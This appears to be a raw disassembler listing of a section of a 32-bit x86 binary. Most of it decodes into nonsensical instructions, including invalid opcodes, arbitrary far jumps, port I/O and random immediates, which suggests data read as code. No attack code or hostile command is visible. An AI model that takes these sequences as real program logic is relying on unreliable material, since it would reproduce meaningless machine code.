  426cf7:	addr16 loop 0x426d29
  426cfa:	cmp    DWORD PTR [ecx-0x52],ebx
  426cfd:	call   0xdc92:0xab277f14
  426d04:	dec    ecx
  426d05:	(bad)  
  426d06:	shl    DWORD PTR [edx+0x65841096],0x30
  426d0d:	push   0x78060398
  426d12:	aad    0x6c
  426d14:	and    eax,0x9b793098
  426d19:	(bad)  
  426d1a:	or     al,0xea
  426d1c:	pop    es
  426d1d:	fs (bad) 
  426d1f:	pop    edi
  426d20:	(bad)  
  426d21:	lock pusha 
  426d23:	jmp    0xd692:0x6e04b6d2
  426d2a:	dec    ebp
  426d2b:	jp     0x426d3b
  426d2d:	in     al,0x76
  426d2f:	outs   dx,DWORD PTR ds:[esi]
  426d30:	add    edx,DWORD PTR [ebp+ebx*8+0x40e8edda]
  426d37:	popf   
  426d38:	pop    ds
  426d39:	cmp    ecx,edx
  426d3b:	test   al,0x9
  426d3d:	sbb    dl,bl
  426d3f:	xchg   ecx,eax
  426d40:	push   eax
  426d41:	ins    DWORD PTR es:[edi],dx
  426d42:	daa    
  426d43:	pop    edi
  426d44:	jnp    0x426d13
  426d46:	js     0x426d2a
  426d48:	cmp    DWORD PTR [ecx+ecx*2-0x5a],ebx
  426d4c:	push   eax
  426d4d:	mov    ch,0x9c
  426d4f:	push   edx
  426d50:	pusha  
  426d51:	sbb    eax,0xf9f830c7
  426d56:	xlat   BYTE PTR ds:[ebx]
  426d57:	mov    eax,0xb204e3ed
  426d5c:	push   eax
  426d5d:	out    0x51,al
  426d5f:	mov    ah,0x93
  426d61:	mov    bh,0x9d
  426d63:	sbb    BYTE PTR [ebx-0x17],bl
  426d66:	scas   al,BYTE PTR es:[edi]
  426d67:	mov    cl,0xc2
  426d69:	jmp    0x662f:0x43720adb
  426d70:	dec    edx
  426d71:	add    al,0x2d
  426d73:	push   esi
  426d74:	lods   al,BYTE PTR ds:[esi]
  426d75:	or     eax,0x11218590
  426d7a:	test   al,0x8f
  426d7c:	push   esi
  426d7d:	gs pop eax
  426d7f:	mov    esi,0x61852e8f
  426d84:	das    
  426d85:	adc    al,0x2a
  426d87:	and    al,0xb6
  426d89:	mov    dl,0x1f
  426d8b:	retf   0x3b5a
  426d8e:	je     0x426dec
  426d90:	add    esp,DWORD PTR gs:[edi-0x29]
  426d94:	nop
  426d95:	inc    eax
  426d96:	icebp  
  426d97:	sbb    eax,DWORD PTR [esp+eax*2]
  426d9a:	cmp    DWORD PTR [ebx-0x2a275d5b],esp
  426da0:	sti    
  426da1:	push   es
  426da2:	cwde   
  426da3:	shl    BYTE PTR [edx],0xbb
  426da6:	cld    
  426da7:	adc    BYTE PTR [eax-0x3fc9d8fb],bl
  426dad:	or     ch,ch
  426daf:	(bad)  
  426db0:	push   ebx
  426db1:	pop    ecx
  426db2:	cmp    ecx,DWORD PTR [esi]
  426db4:	and    eax,0xb23d44e6
  426db9:	fidivr DWORD PTR [ecx+0x3d]
  426dbc:	out    0x3c,eax
  426dbe:	cmp    edx,DWORD PTR [edi+0x52]
  426dc1:	rol    DWORD PTR [edi-0x74253645],0x84
  426dc8:	pop    es
  426dc9:	pop    edi
  426dca:	xor    dh,BYTE PTR [eax+0x6d387ee2]
  426dd0:	and    ebx,esp
  426dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dd3:	push   esi
  426dd4:	int    0x7f
  426dd6:	xchg   ecx,eax
  426dd7:	push   edi
  426dd8:	in     al,dx
  426dd9:	sbb    DWORD PTR [esi+0x259fccfd],esp
  426ddf:	fstp   QWORD PTR [edi-0x3e]
  426de2:	inc    edx
  426de3:	lahf   
  426de4:	sub    eax,0xb54b4162
  426de9:	imul   BYTE PTR [edx+0x1988b463]
  426def:	and    dl,cl
  426df1:	jmp    0x202b:0xddd98c98
  426df8:	out    dx,eax
  426df9:	push   ecx
  426dfa:	xchg   ebx,eax
  426dfb:	pusha  
  426dfc:	inc    ebp
  426dfd:	jnp    0x426d9e
  426dff:	pop    esi
  426e00:	sub    DWORD PTR [ecx],edi
  426e02:	sbb    esi,DWORD PTR [ecx-0x27fad882]
  426e08:	xor    al,0x38
  426e0a:	xor    al,dh
  426e0c:	rcr    DWORD PTR [esp+edx*4-0x1672cf17],cl
  426e13:	pop    eax
  426e14:	retf   0xffc0
  426e17:	inc    eax
  426e18:	dec    ecx
  426e19:	out    dx,al
  426e1a:	sub    ecx,DWORD PTR [ebp+0x34deca14]
  426e20:	ss dec ebp
  426e22:	xor    BYTE PTR [ebx],ch
  426e24:	push   cs
  426e25:	rol    DWORD PTR [ebx],0xb8
  426e28:	cmp    dh,bh
  426e2a:	pop    eax
  426e2b:	pop    es
  426e2c:	pop    ss
  426e2d:	into   
  426e2e:	xchg   esi,eax
  426e2f:	or     ecx,DWORD PTR [edi-0x13b5e0cc]
  426e35:	cld    
  426e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e37:	ret    
  426e38:	int3   
  426e39:	push   edx
  426e3a:	add    eax,0x22d7c448
  426e3f:	(bad)
  426e42:	cli    
  426e43:	push   ss
  426e44:	sub    edx,ebp
  426e46:	fnstsw WORD PTR [ebx+0x21b4b440]
  426e4c:	ficom  DWORD PTR [ebx-0x1fc2e494]
  426e52:	pop    eax
  426e53:	dec    esp
  426e54:	fwait
  426e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e57:	or     BYTE PTR [edi-0x62],dl
  426e5a:	mov    dh,ah
  426e5c:	rcl    DWORD PTR [ecx-0x6c],0x11
  426e60:	cmp    DWORD PTR ds:0x8978e2d8,ebx
  426e66:	and    DWORD PTR [ecx+ebp*4],0xffffff81
  426e6a:	xor    BYTE PTR [esi+0x4c],cl
  426e6d:	call   0xb257c165
  426e72:	int    0xb5
  426e74:	sbb    dl,ch
  426e76:	ffree  st(5)
  426e78:	jmp    0x41a9:0xdb40c90c
  426e7f:	div    BYTE PTR [edi+0x42]
  426e82:	out    0x70,eax
  426e84:	adc    dh,dl
  426e86:	test   BYTE PTR [edx+edi*8],cl
  426e89:	jl     0x426ebf
  426e8b:	cmc    
  426e8c:	call   0xd9934d00
  426e91:	(bad)  
  426e92:	int3   
  426e93:	jnp    0x426e24
  426e95:	push   edx
  426e96:	jl     0x426e5c
  426e98:	push   eax
  426e99:	fldenv [edi-0xfe4d3fc]
  426e9f:	bound  edx,QWORD PTR [ebp-0x44]
  426ea2:	sbb    edx,DWORD PTR ds:[eax-0x2c86ed05]
  426ea9:	inc    esi
  426eaa:	push   ebp
  426eab:	jecxz  0x426f0e
  426ead:	mov    BYTE PTR [ebx-0x7b],dh
  426eb0:	jecxz  0x426f22
  426eb2:	inc    ebp
  426eb3:	mov    bl,0x24
  426eb5:	and    DWORD PTR [ebp+0x28fe374c],ecx
  426ebb:	jg     0x426eca
  426ebd:	and    ebp,esp
  426ebf:	pop    edi
  426ec0:	add    eax,0x51134383
  426ec5:	repz push es
  426ec7:	xlat   BYTE PTR ds:[ebx]
  426ec8:	xor    dh,BYTE PTR [esi+ebx*4]
  426ecb:	rol    BYTE PTR [edx],1
  426ecd:	inc    ebx
  426ece:	ret    
  426ecf:	add    eax,0xb78d23d8
  426ed4:	hlt    
  426ed5:	push   0xffffffa5
  426ed7:	adc    eax,0xe5f1ec2d
  426edc:	(bad)  
  426edd:	mov    eax,0x7fa21ab3
  426ee2:	jae    0x426ee7
  426ee4:	dec    esp
  426ee5:	mov    ah,0x3f
  426ee7:	and    DWORD PTR [eax],0x3ff61182
  426eed:	in     eax,dx
  426eee:	js     0x426ed9
  426ef0:	cmp    BYTE PTR [eax],bh
  426ef2:	mov    ah,0x33
  426ef4:	jle    0x426f4d
  426ef6:	stc    
  426ef7:	or     esi,DWORD PTR [ebx+0x5d]
  426efa:	hlt    
  426efb:	jae    0x426f40
  426efd:	dec    ecx
  426efe:	inc    edx
  426eff:	out    0xb,al
  426f01:	mov    bl,0x7c
  426f03:	popf   
  426f04:	mov    esi,0xf7292918
  426f09:	push   esi
  426f0a:	xor    edx,DWORD PTR [edi-0x5e0e10f0]
  426f10:	sbb    al,BYTE PTR [ecx+0x71]
  426f13:	dec    esi
  426f14:	sub    BYTE PTR ds:0x244ed411,dl
  426f1a:	sub    ebx,edi
  426f1c:	nop
  426f1d:	aad    0x9e
  426f1f:	jb     0x426eea
  426f21:	out    dx,al
  426f22:	xchg   ch,ch
  426f24:	sub    eax,0xdcd5acf0
  426f29:	adc    ecx,DWORD PTR [edx+0x23cc26de]
  426f2f:	popa   
  426f30:	cld    
  426f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f32:	push   ecx
  426f33:	ror    BYTE PTR [ebx+0x21],cl
  426f36:	or     al,0xf5
  426f38:	stos   DWORD PTR es:[edi],eax
  426f39:	dec    edi
  426f3a:	addr16 loop 0x426f46
  426f3d:	ret    0x1a79
  426f40:	jo     0x426f4c
  426f42:	test   DWORD PTR [ecx+0xae99361],eax
  426f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f49:	and    ebx,ecx
  426f4b:	add    DWORD PTR [ebx],ebx
  426f4d:	stos   DWORD PTR es:[edi],eax
  426f4e:	mov    ebp,0xad44e42
  426f53:	idiv   DWORD PTR [eax+0x75b8abb0]
  426f59:	mov    cl,0x20
  426f5b:	or     DWORD PTR [edx-0x51],edx
  426f5e:	imul   esp,DWORD PTR [eax],0x952d295b
  426f64:	pop    edi
  426f65:	enter  0x9a85,0xff
  426f69:	call   0x7e3b:0xcfaa1ac5
  426f70:	dec    edi
  426f71:	sar    BYTE PTR [ecx+eax*1-0x249c6f20],0x6
  426f79:	loopne 0x426efb
  426f7b:	aad    0xa0
  426f7d:	or     BYTE PTR [edi-0x7436f542],bh
  426f83:	mov    gs,WORD PTR ds:0x1ba39637
  426f89:	sub    ecx,ecx
  426f8b:	or     BYTE PTR [ecx],0xaf
  426f8e:	enter  0x8836,0x6d
  426f92:	mov    ebx,0xf64270b3
  426f97:	jno    0x426fb4
  426f99:	mov    esp,0x3ac53c4e
  426f9e:	fs cmp al,0x4e
  426fa1:	clc    
  426fa2:	xchg   esi,eax
  426fa3:	cmp    al,0x2f
  426fa5:	sub    eax,0x36e1a974
  426faa:	mov    ah,0xf5
  426fac:	and    BYTE PTR [ebx+0xa0630e3],cl
  426fb2:	xchg   esi,eax
  426fb3:	sub    al,0x84
  426fb5:	jp     0x42700c
  426fb7:	jle    0x426fca
  426fb9:	add    al,0xea
  426fbb:	or     DWORD PTR [edx+0x0],edx
  426fbe:	jo     0x426f66
  426fc0:	xor    bl,BYTE PTR [edi]
  426fc2:	jmp    DWORD PTR [edx-0x8]
  426fc5:	xlat   BYTE PTR ds:[ebx]
  426fc6:	xchg   ecx,eax
  426fc7:	push   edx
  426fc8:	mov    ecx,0xae8031ba
  426fcd:	into   
  426fce:	mov    eax,0x839528f
  426fd3:	repnz lock les ecx,FWORD PTR [eax+0x48badad3]
  426fdb:	mov    cl,0x6d
  426fdd:	sub    al,0x17
  426fdf:	xor    eax,0x969b549e
  426fe4:	test   eax,0x95580dd
  426fe9:	pop    ds
  426fea:	sbb    al,0x21
  426fec:	jno    0x427035
  426fee:	out    0xf6,eax
  426ff0:	sub    eax,0x206a268d
  426ff5:	adc    BYTE PTR [esi+0x52],cl
  426ff8:	cs pusha 
  426ffa:	mov    ds:0xa2dfd227,eax
  426fff:	mov    edx,0x8c723460
  427004:	push   cs
  427005:	mov    edi,0x9796dd60
  42700a:	outs   dx,BYTE PTR ds:[esi]
  42700b:	pop    edi
  42700c:	adc    esi,DWORD PTR [esi]
  42700e:	mov    al,ds:0x1b8f3765
  427013:	std    
  427014:	idiv   BYTE PTR [edi]
  427016:	pop    ss
  427017:	(bad)  
  427018:	stos   DWORD PTR es:[edi],eax
  427019:	rcl    BYTE PTR [edx+0x4275036c],1
  42701f:	fimul  WORD PTR [ecx+0x40]
  427022:	loope  0x426fb8
  427024:	call   0xb13d:0x379b95b7
  42702b:	ins    DWORD PTR es:[edi],dx
  42702c:	mov    al,ds:0x7ff4b05c
  427031:	inc    edi
  427032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427033:	test   eax,0xa812330b
  427038:	or     al,BYTE PTR [eax-0x3da90da2]
  42703e:	aad    0x56
  427040:	mov    WORD PTR [esi+ebx*8-0x5b],gs
  427044:	mov    cl,0x2f
  427046:	dec    ebx
  427047:	scas   al,BYTE PTR es:[edi]
  427048:	adc    ebx,DWORD PTR [eax+ecx*4-0xc6c3b24]
  42704f:	cmp    eax,0x83cd05ff
  427054:	ror    BYTE PTR [ecx-0x4],cl
  427057:	clc    
  427058:	push   esp
  427059:	cmc    
  42705a:	out    0xb5,eax
  42705c:	clc    
  42705d:	xchg   esi,eax
  42705e:	add    eax,DWORD PTR [eax]
  427060:	xchg   esp,eax
  427061:	pop    esp
  427062:	sti    
  427063:	or     ch,BYTE PTR [ebp+0x5a]
  427066:	or     eax,DWORD PTR [ebp+0x6bb58a3c]
  42706c:	xor    eax,0xa8658240
  427071:	shr    DWORD PTR [eax-0x3d8dbba1],0x88
  427078:	cmp    bh,BYTE PTR [ecx]
  42707a:	cmp    dh,cl
  42707c:	push   esi
  42707d:	jmp    0xe4fe:0xe1ea63c0
  427084:	jo     0x42703f
  427086:	lock xchg BYTE PTR [esi],bh
  427089:	(bad)  
  42708a:	pop    ebp
  42708b:	sar    BYTE PTR [eax],cl
  42708d:	loope  0x4270cf
  42708f:	xor    al,0xf0
  427091:	add    ah,al
  427093:	fnstenv [edi+edx*1+0x10b4acc8]
  42709a:	mov    ebp,DWORD PTR [eax+0x14]
  42709d:	retf   
  42709e:	lods   al,BYTE PTR ds:[esi]
  42709f:	pop    ss
  4270a0:	arpl   di,bx
  4270a2:	cmp    al,0xef
  4270a4:	out    dx,eax
  4270a5:	loope  0x4270d6
  4270a7:	or     dl,bh
  4270a9:	(bad)  
  4270aa:	jmp    0x8b161c73
  4270af:	jns    0x427051
  4270b1:	aas    
  4270b2:	pop    esi
  4270b3:	jns    0x427065
  4270b5:	aas    
  4270b6:	mov    edx,0x90c82169
  4270bb:	push   0x54aa504e
  4270c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270c1:	mov    esi,0x17f78fec
  4270c6:	test   al,0x3c
  4270c8:	lock sub al,0x8d
  4270cb:	push   ebp
  4270cc:	xchg   ecx,eax
  4270cd:	aam    0x39
  4270cf:	push   bx
  4270d1:	push   edx
  4270d2:	gs ds dec esp
  4270d5:	pop    esi
  4270d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270d7:	mov    edx,0x7bdfec72
  4270dc:	dec    ebp
  4270dd:	ins    BYTE PTR es:[edi],dx
  4270de:	lds    ebx,FWORD PTR [edi+ecx*2]
  4270e1:	lods   eax,DWORD PTR ds:[esi]
  4270e2:	sbb    BYTE PTR [edi+0x4564751e],0xf5
  4270e9:	or     al,0x1e
  4270eb:	or     DWORD PTR [ebp-0x486f63f7],eax
  4270f1:	mov    al,ds:0x666300a1
  4270f6:	inc    eax
  4270f7:	push   ebx
  4270f8:	ja     0x42707e
  4270fa:	imul   ebx,DWORD PTR [eax+0x1e0df1ec],0x191b63bb
  427104:	pop    es
  427105:	add    BYTE PTR [edx+0x16],bh
  427108:	aad    0x52
  42710a:	inc    esi
  42710b:	mov    cl,0x58
  42710d:	loopne 0x427164
  42710f:	or     eax,0xaff8d4ba
  427114:	pop    ecx
  427115:	loope  0x4270ee
  427117:	inc    esp
  427118:	jb     0x427161
  42711a:	ins    BYTE PTR es:[edi],dx
  42711b:	or     BYTE PTR [edi+0x4026a99c],cl
  427121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427122:	add    eax,0x6f63a7a0
  427127:	in     al,dx
  427128:	push   esi
  427129:	ins    BYTE PTR es:[edi],dx
  42712a:	inc    ebp
  42712b:	dec    eax
  42712c:	add    DWORD PTR [eax+0x7f],esi
  42712f:	jmp    0x4270cd
  427131:	neg    al
  427133:	mov    es,WORD PTR [esi]
  427135:	dec    esi
  427136:	imul   ecx,DWORD PTR ds:0xddee9472,0xd1edcb51
  427140:	jnp    0x427144
  427142:	dec    ecx
  427143:	ret    0x7ad
  427146:	out    0x8a,eax
  427148:	shl    BYTE PTR [edi],1
  42714a:	sub    eax,0xa4ea603
  42714f:	and    edx,DWORD PTR [ecx+0x3]
  427152:	and    esi,DWORD PTR [ebx+0x6017aaa6]
  427158:	mov    ah,0xfc
  42715a:	adc    al,dh
  42715c:	out    0x5b,eax
  42715e:	call   0x1d07221d
  427163:	push   ebx
  427164:	xor    DWORD PTR [edi],edx
  427166:	xlat   BYTE PTR ds:[ebx]
  427167:	mov    ecx,0x189eefb2
  42716c:	and    eax,0xd1ac247
  427171:	bound  esi,QWORD PTR [edi+esi*1-0x14]
  427175:	test   eax,0x3a1204d
  42717a:	xchg   ecx,eax
  42717b:	out    0xe5,al
  42717d:	pop    es
  42717e:	das    
  42717f:	push   ebp
  427180:	adc    DWORD PTR [eax],esi
  427182:	cmp    ebx,edx
  427184:	stos   DWORD PTR es:[edi],eax
  427185:	test   al,0x76
  427187:	pop    edx
  427188:	js     0x4271f1
  42718a:	mov    ebx,0xcd1c1fe7
  42718f:	push   eax
  427190:	fiadd  WORD PTR [ebx+0x4316a9d1]
  427196:	loope  0x427200
  427198:	sub    eax,esi
  42719a:	imul   esp,DWORD PTR [ebx],0xffffffa0
  42719d:	gs loope 0x4271de
  4271a0:	addr16 push edi
  4271a2:	scas   eax,DWORD PTR es:[edi]
  4271a3:	sbb    esi,DWORD PTR ds:0x80779a3f
  4271a9:	(bad)  
  4271ab:	js     0x42717b
  4271ad:	out    0xad,eax
  4271af:	adc    al,al
  4271b1:	cmp    ch,BYTE PTR ds:0x1d9c0d0d
  4271b7:	xchg   esp,ecx
  4271b9:	bound  edi,QWORD PTR [esi-0x67d96985]
  4271bf:	nop
  4271c0:	bswap  esp
  4271c2:	pushf  
  4271c3:	icebp  
  4271c4:	xchg   esp,eax
  4271c5:	rcl    DWORD PTR [esi+ebx*4+0x7a],1
  4271c9:	icebp  
  4271ca:	xchg   ebp,eax
  4271cb:	xchg   ecx,eax
  4271cc:	mov    eax,ds:0xba9a7aaf
  4271d1:	div    BYTE PTR [esi+0x3c86711e]
  4271d7:	pushf  
  4271d8:	test   esp,ebx
  4271da:	pop    esi
  4271db:	sar    edx,cl
  4271dd:	sub    al,BYTE PTR [esi+ebx*8+0x46]
  4271e1:	cmp    eax,0xc744d494
  4271e6:	mov    eax,0xf6d5edda
  4271eb:	mov    bl,0xdf
  4271ed:	dec    edi
  4271ee:	add    cl,cl
  4271f0:	outs   dx,DWORD PTR ds:[esi]
  4271f1:	xor    DWORD PTR [eax-0x4cf27ca0],eax
  4271f7:	pop    ebx
  4271f8:	sahf   
  4271f9:	or     bl,BYTE PTR [eax+esi*4-0x17]
  4271fd:	outs   dx,BYTE PTR ds:[esi]
  4271fe:	xchg   ebx,eax
  4271ff:	bnd js 0x42723c
  427202:	mov    eax,ds:0xa4435a30
  427207:	lock inc eax
  427209:	popf   
  42720a:	add    bl,bl
  42720c:	inc    ebp
  42720d:	pop    ss
  42720e:	mov    esp,0x917a3258
  427213:	pop    ds
  427214:	add    eax,0xaa670520
  427219:	(bad)  
  42721a:	sub    BYTE PTR [eax-0x1c],dh
  42721d:	sar    DWORD PTR [eax],0x0
	...
  427228:	add    BYTE PTR [eax],al
  42722a:	pop    ecx
  42722b:	dec    edi
  42722c:	dec    esi
  42722d:	dec    ebp
  42722e:	pop    esi
  42722f:	dec    ebp
  427230:	pop    ebx
  427231:	pop    edi
  427232:	in     eax,dx
  427233:	fld    st(4)
  427235:	shl    BYTE PTR [ecx-0x5b],0xf5
  427239:	pop    esp
  42723a:	adc    al,0xff
  42723c:	add    DWORD PTR [eax],eax
  42723e:	add    DWORD PTR [eax],eax
  427240:	add    BYTE PTR [eax],al
  427242:	dec    esi
  427243:	add    BYTE PTR [eax],al
  427245:	add    BYTE PTR [eax],al
  427247:	add    BYTE PTR [eax],al
  427249:	add    BYTE PTR [ebp+0x55],cl
  42724c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427252:	mov    esp,ebp
  427254:	or     al,ah
  427256:	dec    ebp
  427257:	add    bh,al
  427259:	add    BYTE PTR [eax],cl
  42725b:	add    BYTE PTR [eax],al
  42725d:	mov    DWORD PTR [eax],0x3ef44545
  427263:	cmp    BYTE PTR [eax],al
  427265:	test   DWORD PTR [ebx-0x34070b64],ecx
  42726b:	(bad)  
  42726c:	enter  0x4d45,0xb8
  427270:	mov    edi,DWORD PTR [ecx]
  427272:	hlt    
  427273:	test   ebx,ecx
  427275:	pushf  
  427276:	enter  0x4df8,0x8b
  42727a:	mov    DWORD PTR [ebp+0x8],0x894708
  427281:	inc    ebp
  427282:	mov    ebp,0xff8bfffc
  427287:	dec    ebp
  427288:	mov    ch,0xf4
  42728a:	call   DWORD PTR [ebx-0x1]
  42728d:	mov    ebx,0x8005022
  427292:	call   DWORD PTR [ecx+0x8]
  427295:	pop    es
  427296:	jmp    0xb8:0x9cb4533
  42729d:	cwde   
  42729e:	mov    esi,DWORD PTR [edx-0xc]
  4272a1:	xor    al,bl
  4272a3:	add    BYTE PTR [eax+0x3c83203],bl
  4272a9:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  4272af:	mov    eax,DWORD PTR [ebx-0xb87b3]
  4272b5:	xor    eax,DWORD PTR [eax]
  4272b7:	retf   
  4272b8:	ret    
  4272b9:	add    eax,esi
  4272bb:	enter  0x8945,0x64
  4272bf:	dec    ebp
  4272c0:	sbb    ah,cl
  4272c2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272c8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ce:	test   DWORD PTR [ebx],esi
  4272d0:	dec    ebx
  4272d2:	inc    DWORD PTR [ebx]
  4272d4:	inc    eax
  4272d5:	enter  0x8989,0x64
  4272d9:	(bad)  
  4272da:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272de:	cld    
  4272df:	dec    DWORD PTR [ebp-0xa90001]
  4272e5:	push   edi
  4272e6:	mov    BYTE PTR [edx+0x1],ch
  4272e9:	and    BYTE PTR [eax],al
  4272eb:	pop    ecx
  4272ec:	inc    ebp
  4272ed:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272f3:	push   0xffffff89
  4272f5:	pop    ecx
  4272f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272f7:	dec    ebp
  4272f8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272fe:	jne    0x427348
  427300:	lea    eax,[eax]
  427302:	fs (bad) 
  427304:	dec    DWORD PTR [eax]
  427306:	mov    DWORD PTR [eax],eax
  427308:	test   al,0x0
  42730a:	add    BYTE PTR [ebp-0x18],cl
  42730d:	xor    ebp,DWORD PTR [edx]
  42730f:	add    eax,DWORD PTR [eax]
  427311:	mov    eax,eax
  427313:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  42731a:	inc    ebp
  42731b:	mov    DWORD PTR [ebx+0x459408],ecx
  427321:	popa   
  427322:	mov    esp,DWORD PTR [ebp-0x75]
  427325:	(bad)  
  427326:	cld    
  427327:	inc    eax
  427328:	cmp    bh,0x1
  42732b:	lea    eax,[eax]
  42732d:	and    BYTE PTR [eax],al
  42732f:	inc    DWORD PTR [ecx-0x18]
  427332:	mov    ecx,DWORD PTR [ebx]
  427334:	cld    
  427335:	add    BYTE PTR [ecx+0x75014d],cl
  42733b:	(bad)  
  42733c:	xchg   ebp,eax
  42733d:	sar    bh,1
  42733f:	inc    eax
  427340:	inc    DWORD PTR [eax]
  427342:	mov    eax,DWORD PTR [ebp-0x4]
  427345:	xor    edx,DWORD PTR [edx+0x7201be]
  42734b:	add    BYTE PTR [edx],dl
  42734d:	(bad)  
  42734e:	nop
  42734f:	inc    ebp
  427350:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427356:	mov    al,0xff
  427358:	add    bh,bh
  42735a:	add    BYTE PTR [ebx],dh
  42735c:	inc    DWORD PTR [ebx]
  42735e:	sbb    al,0x89
  427360:	jne    0x42733e
  427362:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427368:	mov    eax,DWORD PTR [ebp-0xff0048]
  42736e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427375:	inc    DWORD PTR [ebp-0x75]
  427378:	fisttp QWORD PTR [eax+ebp*8]
  42737b:	test   DWORD PTR [esi-0x1],esp
  42737e:	inc    ebp
  42737f:	(bad)  
  427380:	aas    
  427381:	inc    ebp
  427382:	(bad)  
  427383:	lea    edi,[eax+edi*2-0x1]
  427387:	inc    edi
  427389:	mov    DWORD PTR ds:0x8000c7a0,edi
  42738f:	mov    ebp,esi
  427391:	cld    
  427392:	in     al,0x8d
  427394:	inc    ebp
  427395:	(bad)  
  427396:	call   0xc7cb539a
  42739b:	add    DWORD PTR [eax-0x11ba1500],ecx
  4273a1:	inc    DWORD PTR [ebp-0x4]
  4273a4:	out    0x8d,eax
  4273a6:	aas    
  4273a7:	(bad)  
  4273a8:	call   0xca9eac
  4273ad:	add    DWORD PTR [ebx-0x7f570400],ecx
  4273b3:	add    BYTE PTR [ecx],al
  4273b5:	test   DWORD PTR [eax],eax
  4273b7:	wrmsr  
  4273b9:	jae    0x4273a8
  4273bb:	add    BYTE PTR [eax],al
  4273bd:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273c3:	add    esp,edi
  4273c5:	add    BYTE PTR [eax+0x450108],al
  4273cb:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ce:	add    DWORD PTR [eax],0x4
  4273d1:	mov    eax,DWORD PTR [ebp+0x3]
  4273d4:	mov    edi,DWORD PTR [esp+edi*8]
  4273d7:	dec    ebp
  4273d8:	nop
  4273d9:	mov    eax,DWORD PTR [ecx]
  4273db:	fadd   DWORD PTR [eax]
  4273dd:	add    BYTE PTR [esi],al
  4273df:	lea    eax,[eax]
  4273e1:	pusha  
  4273e2:	push   eax
  4273e3:	inc    DWORD PTR [ebp+0x52]
  4273e6:	call   DWORD PTR [ebp-0x7b]
  4273e9:	mov    esi,DWORD PTR [ebp-0x74]
  4273ec:	mov    eax,DWORD PTR [eax]
  4273ee:	cld    
  4273ef:	mov    eax,DWORD PTR [eax+0x880103]
  4273f5:	add    BYTE PTR [ebp+0x6a],bh
  4273f8:	cmp    edi,0x10
  4273fb:	mov    WORD PTR [ebp+0x0],es
  4273fe:	mov    edx,DWORD PTR [edx-0x4]
  427401:	push   ecx
  427402:	nop
  427403:	inc    DWORD PTR [ecx]
  427405:	cld    
  427406:	add    BYTE PTR [ebp-0x24],bh
  427409:	mov    eax,DWORD PTR [eax]
  42740b:	cld    
  42740c:	push   eax
  42740d:	nop
  42740e:	inc    ebp
  42740f:	add    edi,edi
  427411:	add    BYTE PTR [ebx+0x4de4f445],cl
  427417:	in     al,dx
  427418:	xor    eax,edi
  42741a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427421:	mov    DWORD PTR [eax],0xb8788b98
  427427:	test   ebx,eax
  427429:	jmp    FWORD PTR [eax-0x1]
  42742c:	int    0xed
  42742e:	sub    esp,eax
  427430:	add    eax,DWORD PTR [ebp-0x30]
  427433:	fild   WORD PTR [ebp+0x3f]
  427436:	cmp    eax,edi
  427438:	je     0xca43545a
  42743e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427445:	(bad)  
  427446:	jne    0x4273d4
  427448:	mov    ebx,ebp
  42744a:	cld    
  42744b:	js     0x427492
  42744d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427453:	inc    ebp
  427454:	call   0xea9de4
  427459:	add    BYTE PTR [ebx-0x7f170301],cl
  42745f:	add    DWORD PTR es:[eax],eax
  427462:	add    al,al
  427464:	xor    BYTE PTR [eax+0x41],dl
  427467:	inc    ebp
  427468:	add    BYTE PTR [ebx+0xfcd88b],cl
  42746e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427474:	add    DWORD PTR [ecx+0x458be845],ecx
  42747a:	fmul   DWORD PTR [ebx+0x8bb800]
  427480:	cld    
  427481:	call   0xd79f46
  427486:	dec    DWORD PTR [ebx+0x1090e8ff]
  42748c:	add    al,al
  42748e:	push   eax
  42748f:	es inc ebp
  427491:	inc    ebp
  427492:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427498:	dec    DWORD PTR [ebx-0x3ff70301]
  42749e:	mov    DWORD PTR gs:[eax],eax
  4274a1:	call   0x8b6aba66
  4274a6:	inc    ebp
  4274a7:	mov    eax,0xe8d8008b
  4274ac:	add    BYTE PTR [ecx],ch
  4274ae:	mov    eax,DWORD PTR [eax]
  4274b0:	cld    
  4274b1:	mov    eax,eax
  4274b3:	call   0x462a850d
  4274b8:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4274be:	cld    
  4274bf:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274c6:	xor    BYTE PTR [eax],al
  4274c8:	push   edi
  4274c9:	inc    ebp
  4274ca:	mov    DWORD PTR [ebx],esi
  4274cc:	in     al,0xb9
  4274ce:	inc    ebp
  4274cf:	lea    ecx,[ebx-0x3c370301]
  4274d5:	dec    ebp
  4274d6:	cwde   
  4274d7:	mov    esi,DWORD PTR [edx]
  4274d9:	or     BYTE PTR [ebx],al
  4274db:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274e2:	call   0x429e2c
  4274e7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274ed:	jge    0x427522
  4274ef:	mov    eax,DWORD PTR [ebx]
  4274f1:	cld    
  4274f2:	lea    edx,[eax+0xff0120]
